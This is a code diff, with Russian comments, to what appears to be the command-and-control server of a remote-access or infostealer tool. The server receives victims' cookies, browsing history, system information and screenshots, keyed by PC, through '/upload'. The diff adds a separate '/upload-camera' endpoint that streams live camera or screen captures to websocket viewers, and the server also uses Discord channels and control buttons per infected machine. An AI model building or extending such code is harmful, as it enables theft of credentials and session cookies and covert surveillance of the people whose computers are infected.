@@ -112,7 +112,7 @@ async function getOrCreateTextChannel(guild, name, parentId){
     return channel;
 }
 
-// ---------- Приём данных ----------
+// ---------- Приём данных: файлы ----------
 app.post("/upload", async (req, res) => {
     try {
         const { pcId, cookies, history, systemInfo, screenshot } = req.body;
@@ -139,8 +139,22 @@ app.post("/upload", async (req, res) => {
         // ---------- Отправка кнопок при первом подключении ПК ----------
         if(isNewPC) await sendControlButtons(pcId);
 
-        // ---------- Live камера ----------
-        if(screenshot && wsCameraClients[pcId]){
+        res.json({ success:true });
+    } catch(err){
+        console.error(err);
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// ---------- Приём данных: камера ----------
+app.post("/upload-camera", (req, res) => {
+    try {
+        const { pcId, screenshot } = req.body;
+        if(!pcId || !screenshot) return res.status(400).json({ error:"pcId и screenshot required" });
+
+        onlinePCs[pcId] = Date.now();
+
+        if(wsCameraClients[pcId]){
             wsCameraClients[pcId].forEach(ws => {
                 try { ws.send(screenshot); } catch(e){ }
             });
